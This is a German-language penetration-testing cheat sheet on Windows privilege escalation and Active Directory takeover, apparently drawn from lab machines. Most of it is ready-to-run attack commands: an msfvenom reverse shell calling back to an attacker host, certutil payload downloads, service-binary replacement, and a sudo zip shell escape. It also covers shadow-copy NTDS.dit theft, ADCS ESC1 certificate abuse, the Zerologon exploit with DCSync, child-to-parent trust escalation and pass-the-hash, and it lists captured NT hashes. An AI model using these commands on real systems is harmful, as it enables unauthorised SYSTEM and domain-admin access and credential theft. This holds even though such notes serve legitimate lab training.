# Windows Privilege Escalation


## Ziel der Phase

- Erlangung höherer Berechtigungen (SYSTEM, Domain Admin, Enterprise Admin)
- Ausnutzung von Fehlkonfigurationen und Schwachstellen
- Eskalation von Low-Privilege User zu Administrator/SYSTEM

---

## Relevante Techniken & Vorgehensweisen

### Enumeration für Privilege Escalation

**Berechtigungen prüfen:**

cmd

```cmd
whoami /priv
```

**Sudo-Rechte (Linux):**


```bash
sudo -l
```

**Command History:**


```bash
history
```

### WinPEAS (Windows Privilege Escalation Awesome Scripts)

**HTTP-Server starten (Kali):**


```bash
python3 -m http.server 80
```

**Download auf Windows:**

cmd

```cmd
cd \users\butler
certutil.exe -urlcache -f http://<ATTACKER_IP>/winPEASx64.exe winPEASx64.exe
```

**Ausführen:**

cmd

```cmd
dir
winPEASx64.exe
```

**Findings interpretieren:**

- Red/Yellow = High probability exploit vectors

### Service-based Privilege Escalation

**Vulnerable Service gefunden (WinPEAS):**

- WiseBootAssistant
- Unquoted Service Path
- Läuft mit SYSTEM-Rechten

**Exploitation-Schritte:**

1. **Payload erstellen:**


```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=7777 -f exe -o Wise.exe
```

2. **HTTP-Server starten:**


```bash
python3 -m http.server 80
```

3. **Netcat-Listener:**


```bash
nc -nvlp 7777
```

4. **Service-Manipulation:**

cmd

```cmd
cd "C:\Program Files (x86)\Wise\"
certutil -urlcache -f http://<ATTACKER_IP>/Wise.exe Wise.exe
sc stop WiseBootAssistant
sc query WiseBootAssistant
copy BootTime.exe BootTime.exe.bak
copy Wise.exe BootTime.exe
sc start WiseBootAssistant
```

5. **Verify SYSTEM:**

cmd

```cmd
whoami  # NT AUTHORITY\SYSTEM
```

### GTFOBins (Linux)

**ZIP Privilege Escalation:**


```bash
# Temporary File Variable
TF=$(mktemp -u)

# ZIP Privilege Escalation
sudo zip $TF /etc/hosts -T -TT 'sh #'

# Optional Cleanup
sudo rm $TF

# Verify
id
whoami
```

**Konzept:**

- sudo zip mit SYSTEM-Rechten
- -T/-TT flags führen Shell-Command aus

### PrintSpoofer (SeImpersonatePrivilege)

**Voraussetzung:**

- SeImpersonatePrivilege für aktuellen Prozess

**Exploit:**


```bash
./PrintSpoofer.exe -i -c cmd
```

**Resultat:**

- NT AUTHORITY\SYSTEM

**Konzept:**

- SeImpersonatePrivilege erlaubt Impersonation
- PrintSpoofer missbraucht Druckerspooler-Mechanik

### PDF24 Creator MSI Privilege Escalation (CVE-2023-49147)

**Voraussetzungen:**

- PDF24 via MSI installiert
- Low-privileged User
- SetOpLock.exe Tool

**SetOpLock.exe beschaffen:**


```bash
git clone https://github.com/p1sc3s/Symlink-Tools-Compiled.git
cd Symlink-Tools-Compiled
ls
sudo python3 -m http.server 8000 --bind <ATTACKER_IP>
```

**Auf Windows downloaden:**

cmd

```cmd
cd C:\Users\Public
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/SetOpLock.exe SetOpLock.exe
dir SetOpLock.exe
```

**Exploitation-Schritte:**

1. **OpLock setzen (Terminal 1):**

cmd

```cmd
C:\Users\Public\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

**NICHT ENTER DRÜCKEN!**

2. **Repair starten (Terminal 2):**

cmd

```cmd
msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

- "Repair" auswählen
- "No Reboot" Option
- CMD-Fenster öffnet sich und hängt (gewollt)

3. **SYSTEM Shell spawnen:**

- Rechtsklick auf CMD-Fenster Titelleiste
- "Properties"
- "Legacy console mode" Link klicken
- Browser öffnet sich
- CTRL+O (File Open Dialog)
- Adressleiste: `cmd.exe`
- Enter

**Resultat:**

- Neues CMD mit SYSTEM-Rechten

### NFS Privilege Escalation (UID Spoofing)

**UID ermitteln:**


```bash
id peter.turner@hybrid.vl
# uid=902601108
```

**User lokal erstellen:**


```bash
useradd --badname -u 902601108 peter.turner@hybrid.vl
```

**SUID Bash über NFS:**


```bash
cp /bin/bash /opt/share/
chmod +s /mnt/tmpmnt/bash
```

**Privileged Shell:**


```bash
/opt/share/bash -p
whoami  # peter.turner@hybrid.vl
```

### Volume Shadow Copy (SeBackupPrivilege)

**Berechtigungen prüfen:**

cmd

```cmd
whoami /priv
```

**Wichtige Privileges:**

- SeBackupPrivilege
- SeRestorePrivilege

**Shadow Copy erstellen:**

powershell

```powershell
"set context persistent nowriters" | Out-File extract.dsh -Encoding ASCII
"add volume c: alias baby" | Out-File extract.dsh -Append -Encoding ASCII
"create" | Out-File extract.dsh -Append -Encoding ASCII
"expose %baby% z:" | Out-File extract.dsh -Append -Encoding ASCII
diskshadow /s extract.dsh
```

**Dateien kopieren:**

cmd

```cmd
robocopy z:\windows\ntds C:\Temp ntds.dit /B
robocopy z:\windows\system32\config C:\Temp system /B
```

**Download:**

powershell

```powershell
download ntds.dit
download SYSTEM
```

**Hash Extraction:**


```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Pass-the-Hash:**


```bash
evil-winrm -i <TARGET_IP> -u Administrator -H <NT_HASH>
```

### Computer Account Takeover

**Passwort ändern:**


```bash
changepasswd.py retro.vl/banking$:banking@<TARGET_IP> -altuser trainee -altpass trainee -newpass password1@
```

**Konzept:**

- Computer-Accounts können standardmäßig ihre Passwörter ändern
- Mit authentifiziertem Account (trainee) möglich

### ADCS Certificate Services Exploitation (ESC1)

**Certificate Templates Enumeration:**


```bash
certipy-ad find -u 'banking$@retro.vl' -p 'password1@' -dc-ip <TARGET_IP>
```

**ESC1 Vulnerability:**

- Client Authentication: Enabled
- Enrollee Supplies Subject: True
- Certificate Name Flag: EnrolleeSuppliesSubject
- Enrollment Rights: RETRO.VL\Domain Computers

**Certificate für Administrator anfordern:**


```bash
certipy-ad req -u 'banking$@retro.vl' -p 'password1@' -ca 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -dns 'dc.retro.vl' -key-size 4096 -dc-ip <TARGET_IP>
```

**Authentication mit Certificate:**


```bash
certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
# UPN-Identity wählen: 0 (administrator@retro.vl)
```

**Resultat:**

- NT-Hash des Administrators

**WinRM Login:**


```bash
evil-winrm -i retro.vl -u 'administrator' -H '<NT_HASH>'
```

### Zerologon (CVE-2020-1472)

**Vulnerability Check:**


```bash
nxc smb retro2.vl -M zerologon
```

**Exploit herunterladen:**


```bash
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472
```

**Exploit ausführen:**


```bash
python3 cve-2020-1472-exploit.py <NETBIOS_NAME> <TARGET_IP>
# Beispiel: python3 cve-2020-1472-exploit.py BLN01 <TARGET_IP>
```

**Resultat:**

- DC Machine Account Passwort = leer
- DCSync-Rechte ermöglicht

**DCSync Attack:**


```bash
secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
```

**Pass-the-Hash:**


```bash
psexec.py -hashes :<NT_HASH> Administrator@<TARGET_IP>
```

### Child-to-Parent Domain Escalation

**Credential Extraction:**


```bash
lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl <TARGET_IP>
```

**Domain SID ermitteln:**


```bash
lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@<TARGET_IP>
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://<TARGET_IP> trusts
```

**DNS Setup (Critical!):**


```bash
echo "<CHILD_DC_IP> lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
echo "<PARENT_DC_IP> trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
```

**Automatische Escalation:**


```bash
raiseChild.py lab.trusted.vl/cpowers -hashes :<NT_HASH>
```

**Parent Domain Compromise:**


```bash
secretsdump.py -hashes :<ADMIN_HASH> trusted.vl/Administrator@<PARENT_DC_IP>
evil-winrm -i <PARENT_DC_IP> -u Administrator -H <ADMIN_HASH>
```

### Pass-the-Cert

**Keytab zu Hash:**


```bash
python3 keytabextract.py krb5.keytab
# NTLM: 0f916c5246fdbc7ba95dcef4126d57bd
```

**Certificate Request:**


```bash
certipy-ad req -u 'MAIL01$' -hashes :<NTLM_HASH> -ca hybrid-DC01-CA -target <TARGET_IP> -template HybridComputers -upn administrator@hybrid.vl -key-size 4096
```

**Password Reset via Certificate:**


```bash
python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip <TARGET_IP> -target administrator -new-pass Password123!
```

**Domain Admin:**


```bash
evil-winrm -i <TARGET_IP> -u administrator -p 'Password123!'
```

---

## Betriebssystem-spezifische Aspekte (Windows)

### Windows Privileges

**SeBackupPrivilege:**

- Ermöglicht Volume Shadow Copy
- Zugriff auf NTDS.dit ohne Domain Admin

**SeRestorePrivilege:**

- Zusammen mit SeBackupPrivilege für Shadow Copy

**SeImpersonatePrivilege:**

- PrintSpoofer/Potato-Exploits
- Privilege Escalation zu SYSTEM

### Windows Services

**Unquoted Service Path:**

- WiseBootAssistant
- Service läuft mit SYSTEM-Rechten
- Binary-Ersetzung möglich

**MSI Installer:**

- PDF24 Creator 11.15.1 (CVE-2023-49147)
- Repair-Funktion läuft als SYSTEM
- OpLock-Manipulation möglich

### Active Directory

**Computer Accounts:**

- BANKING$ (alter Pre-created Account)
- MAIL01$ (Machine Account)
- Können Passwörter ändern
- Domain Computers Enrollment Rights

**Certificate Services (ADCS):**

- ESC1: Enrollee Supplies Subject
- Domain Computers können Admin-Certificates anfordern

**Trust Relationships:**

- Child-to-Parent Domain Escalation
- Trust-Key-Extraktion
- SID-History Injection

**Domain Controller:**

- Zerologon (CVE-2020-1472)
- Windows Server 2008 R2 - 2019
- Machine Account Password = leer

---

## Typische Angriffsflächen

### Service-Misconfigurations

**WiseBootAssistant:**

- Unquoted Service Path
- Writable Service Directory
- SYSTEM-Rechte

**PDF24 Creator:**

- MSI Installer mit SYSTEM-Rechten
- OpLock-Manipulation möglich
- Browser-Trick für CMD-Spawn

### Privileges

**SeBackupPrivilege:**

- Volume Shadow Copy
- NTDS.dit Extraction

**SeImpersonatePrivilege:**

- PrintSpoofer
- Potato-Exploits

**sudo zip (Linux):**

- GTFOBins
- Shell-Command Execution

### Active Directory

**Computer Account Takeover:**

- Alter/ungepatchter Account (BANKING$)
- Password Change möglich

**ADCS ESC1:**

- Template: RetroClients, HybridComputers
- Enrollee Supplies Subject = True
- Domain Computers Enrollment

**Zerologon:**

- Windows Server 2008 R2, 2022 (ungepatchet)
- DC Machine Account Password Reset

**Trust Relationships:**

- Child-to-Parent Escalation
- Trust-Key-Extraktion
- SID-History

### NFS-Misconfigurations

**UID Spoofing:**

- World-readable/writable Exports
- SUID Binary Creation möglich

---

## Wichtige Befehle & Syntax

### Service Control

cmd

```cmd
sc query <SERVICE>
sc stop <SERVICE>
sc start <SERVICE>
```

### GTFOBins ZIP


```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

### Volume Shadow Copy

powershell

```powershell
diskshadow /s extract.dsh
robocopy <SOURCE> <DEST> <FILE> /B
```

### Certipy ESC1


```bash
certipy-ad find -u <USER> -p <PASS> -dc-ip <IP>
certipy-ad req -u <USER> -p <PASS> -ca <CA> -target <TARGET> -template <TEMPLATE> -upn <UPN> -key-size 4096 -dc-ip <IP>
certipy-ad auth -pfx <PFX_FILE> -dc-ip <IP>
```

### Zerologon


```bash
python3 cve-2020-1472-exploit.py <NETBIOS_NAME> <TARGET_IP>
secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
```

### raiseChild.py


```bash
raiseChild.py <CHILD_DOMAIN>/<USER> -hashes :<NT_HASH>
```

### Pass-the-Cert


````bash
python3 passthecert.py -action modify_user -crt <CRT> -key <KEY> -domain <DOMAIN> -dc-ip <IP> -target <USER> -new-pass <PASS>
```

---

## Reihenfolge & Abhängigkeiten

### Service-Exploitation Flow

1. **WinPEAS ausführen** → Vulnerable Service finden
2. **Payload generieren** → msfvenom
3. **HTTP-Server starten** → python3 -m http.server
4. **Listener starten** → nc -nvlp
5. **Service stoppen** → sc stop
6. **Backup erstellen** → copy
7. **Binary ersetzen** → copy
8. **Service starten** → sc start
9. **Verify SYSTEM** → whoami

### GTFOBins Flow (Linux)

1. **sudo -l prüfen** → Verfügbare Befehle
2. **GTFOBins recherchieren** → sudo-Section
3. **Exploit ausführen** → TF=$(mktemp -u); sudo zip...
4. **Verify root** → id, whoami

### Volume Shadow Copy Flow

1. **Berechtigungen prüfen** → whoami /priv
2. **SeBackupPrivilege vorhanden?** → Ja
3. **Shadow Copy erstellen** → diskshadow
4. **NTDS.dit kopieren** → robocopy /B
5. **SYSTEM kopieren** → robocopy /B
6. **Download** → Evil-WinRM download
7. **Hash Extraction** → secretsdump
8. **Pass-the-Hash** → Evil-WinRM

### ADCS ESC1 Flow

1. **Computer Account Takeover** → changepasswd.py
2. **Certificate Enumeration** → certipy find
3. **ESC1 identifizieren** → Enrollee Supplies Subject
4. **Certificate Request** → certipy req (UPN=administrator)
5. **Authentication** → certipy auth
6. **NT Hash erhalten** → Administrator
7. **Pass-the-Hash** → Evil-WinRM

### Zerologon Flow

1. **Vulnerability Check** → nxc zerologon
2. **Exploit herunterladen** → git clone
3. **Exploit ausführen** → cve-2020-1472-exploit.py
4. **DCSync** → secretsdump (DC Machine Account)
5. **Administrator Hash** → Aus DCSync-Ausgabe
6. **Pass-the-Hash** → psexec.py

### Child-to-Parent Flow

1. **Child Domain Admin** → net group "Domain Admins"
2. **Credentials extrahieren** → lsassy
3. **Domain SID ermitteln** → lookupsid
4. **Trust-Info sammeln** → ldeep trusts
5. **DNS konfigurieren** → /etc/hosts (Critical!)
6. **raiseChild.py** → Automatische Escalation
7. **Parent Domain Compromise** → secretsdump
8. **Pass-the-Hash** → Evil-WinRM

### PDF24 MSI Flow

1. **SetOpLock.exe beschaffen** → git clone, download
2. **OpLock setzen (Terminal 1)** → SetOpLock.exe (NICHT ENTER!)
3. **MSI Repair (Terminal 2)** → msiexec /fa
4. **CMD hängt** → Gewollt
5. **Browser-Trick** → Properties → Legacy console mode
6. **CTRL+O** → File Open Dialog
7. **cmd.exe eingeben** → SYSTEM Shell

---

## Typische Findings & Fehler

### Erfolgreiche Escalations

**Butler VM (Service-Exploitation):**
```
Initial: butler user
Tool: WinPEAS
Vulnerability: WiseBootAssistant (Unquoted Service Path)
Payload: Wise.exe → BootTime.exe
Result: NT AUTHORITY\SYSTEM
```

**Dev VM (GTFOBins ZIP):**
```
User: jeanpaul
sudo -l: /usr/bin/zip
Method: GTFOBins ZIP Exploit
Result: root
```

**Baby VM (Volume Shadow Copy):**
```
User: Caroline.Robinson
Privileges: SeBackupPrivilege, SeRestorePrivilege
Method: Volume Shadow Copy → NTDS.dit
Hash: Administrator:ee4457ae59f1e3fbd764e33d9cef123d
Result: Pass-the-Hash → Domain Admin
```

**Retro VM (ADCS ESC1):**
```
User: trainee:trainee
Target: BANKING$ (Computer Account)
Vulnerability: ESC1 (RetroClients Template)
Certificate: administrator@retro.vl
Hash: 252fac7066d93dd009d4fd2cd0368389
Result: Domain Admin
```

**Retro2 VM (Zerologon):**
```
Target: Windows Server 2008 R2 (BLN01)
Vulnerability: CVE-2020-1472 (Zerologon)
Method: DC Machine Account Password = leer
DCSync: Administrator:c06552bdb50ada21a7c74536c231b848
Result: Domain Admin
```

**Trusted VM (Child-to-Parent):**
```
Child Domain: lab.trusted.vl
Parent Domain: trusted.vl
Method: raiseChild.py (cpowers)
Parent Admin Hash: 15db914be1e6a896e7692f608a9d72ef
Result: Enterprise Admin
```

**Lock VM (PDF24 MSI):**
```
User: Gale.Dekarios
Software: PDF24 Creator 11.15.1
Vulnerability: CVE-2023-49147
Method: OpLock + MSI Repair + Browser Trick
Result: NT AUTHORITY\SYSTEM
```

**Hybrid VM (Pass-the-Cert):**
```
Machine Account: MAIL01$
Keytab: krb5.keytab → NTLM Hash
Template: HybridComputers (ESC1)
Certificate: administrator@hybrid.vl
Method: PassTheCert → Password Reset
Result: Domain Admin
```

**Relevant VM (PrintSpoofer):**
```
Privilege: SeImpersonatePrivilege
Method: PrintSpoofer.exe -i -c cmd
Result: NT AUTHORITY\SYSTEM
```

### Fehlerhafte Escalations

**Service-Exploitation schlägt fehl:**
- Backup nicht erstellt → Original überschrieben
- Listener nicht gestartet
- Payload-Architektur falsch (x64 vs x86)

**WinPEAS findet nichts:**
- Zu schnell ausgewertet → Red/Yellow-Findings prüfen
- Unbekannte Vulnerability → Manual Enumeration nötig

**GTFOBins ZIP:**
- sudo -l nicht ausgeführt → Verfügbare Befehle unbekannt
- Syntax-Fehler → Exakt GTFOBins-Syntax verwenden

**Volume Shadow Copy:**
- SeBackupPrivilege fehlt → Alternative Methode nötig
- robocopy ohne /B → Zugriff verweigert
- Diskshadow-Script fehlerhaft → Encoding ASCII wichtig

**ADCS ESC1:**
- Template nicht ESC1-verwundbar → Andere Templates prüfen
- Enrollment Rights fehlen → Computer Account nötig
- Certificate Authentication schlägt fehl → UPN-Identity wählen

**Zerologon:**
- NetBIOS-Name falsch → Nicht Hostname verwenden
- DC bereits gepatchet → Vulnerability Check nötig
- Passwort-Wiederherstellung vergessen → Domain-Beschädigung

**Child-to-Parent:**
- DNS nicht konfiguriert → /etc/hosts kritisch!
- Trust-Key falsch → ldeep trusts verwenden
- raiseChild.py schlägt fehl → Credentials überprüfen

**PDF24 MSI:**
- OpLock zu früh losgelassen → NICHT ENTER drücken!
- MSI Repair nicht hängen → Repair-Prozess prüfen
- Browser öffnet sich nicht → Legacy console mode Link

### WinPEAS Findings

**High Probability Vectors (Red/Yellow):**
- Unquoted Service Paths
- Writable Service Directories
- SYSTEM-Services mit User-Kontrolle
- SeImpersonatePrivilege
- AlwaysInstallElevated
- Stored Credentials

### Certificate Template Findings

**ESC1-Vulnerable Templates:**
```
RetroClients:
- Client Authentication: Enabled
- Enrollee Supplies Subject: True
- Enrollment Rights: Domain Computers

HybridComputers:
- Client Authentication: Enabled
- Enrollee Supplies Subject: True
- Enrollment Rights: Domain Computers
````

### Privilege Findings

**SeBackupPrivilege + SeRestorePrivilege:**

- Volume Shadow Copy möglich
- NTDS.dit Extraction ohne Domain Admin

**SeImpersonatePrivilege:**

- PrintSpoofer
- JuicyPotato (ältere Windows-Versionen)

**sudo zip (Linux):**

- GTFOBins Exploit
- Shell as root
